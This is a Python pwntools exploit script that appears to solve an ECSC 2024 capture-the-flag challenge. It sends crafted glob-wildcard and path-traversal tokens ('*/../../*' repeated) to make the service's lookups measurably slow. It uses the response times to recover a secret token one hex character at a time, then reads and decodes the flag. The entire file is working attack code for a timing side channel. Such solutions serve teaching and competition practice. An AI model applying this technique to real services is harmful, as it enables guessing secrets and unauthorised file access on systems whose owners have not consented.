#!/usr/bin/env python3

import logging
import os

logging.disable()

HOST = os.environ.get("HOST", "bs3.challs.external.open.ecsc2024.it")
PORT = int(os.environ.get("PORT", 38315))

from base64 import b64decode
from dataclasses import dataclass
from pwn import remote
import time

r = remote(HOST, PORT, level='info')

# find correct number of wildcards to notice slowdown
payload = b'*/../../*'
for i in range(20):
	r.recvuntil(b'4. Exit\n')
	r.sendline(b'2')
	r.recvuntil(b'Enter token:')
	r.sendline(payload + b'/../*'*i)
	r.recvuntil(b'Enter file name:')
	r.sendline(b'asd')
	t0 = time.time()
	r.recvline()
	dt = time.time() - t0

	# 1 second should be enough to distinguish cases, 
	# if it pings slower than than that it's a problem
	if dt > 1:
		break
else:
	raise Exception('Impossible')

# print(f'{dt=}, {i=}')
payload += b'/../*'*i

@dataclass
class Timed:
	b: bytes
	t: float

found = b''
for _ in range(16):
	times = []
	for s in b'0123456789abcdef':
		s = bytes((s,))

		r.recvuntil(b'4. Exit\n')
		r.sendline(b'2')
		r.recvuntil(b'Enter token:')
		# TODO: this line should change based on cpu share of the remote instance
		r.sendline(found + s + payload)
		r.recvuntil(b'Enter file name:')
		r.sendline(b'asd')
		t0 = time.time()
		r.recvline()
		dt = time.time() - t0
		times.append(Timed(s, dt))

	# print(times)
	found += max(times, key=lambda e: e.t).b
	# print(found)


r.recvuntil(b'4. Exit\n')
r.sendline(b'3')
r.recvuntil(b'Enter token:')
r.sendline(found)
r.recvuntil(b'Enter file name:')
r.sendline(b'flag')
flag = r.recvline().strip()
print(b64decode(flag).decode())
r.close()
